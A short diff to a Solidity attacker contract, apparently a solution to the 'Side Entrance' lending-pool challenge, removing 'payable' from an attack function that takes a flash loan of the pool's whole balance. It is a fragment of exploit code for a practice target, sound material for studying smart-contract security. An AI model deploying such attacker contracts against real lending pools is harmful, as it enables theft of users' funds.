@@ -12,7 +12,7 @@ contract SideEntranceLenderPoolAttacker {
         pool = SideEntranceLenderPool(addr);
     }
 
-    function attack() public payable {
+    function attack() public {
         pool.flashLoan(address(pool).balance);
     }
 
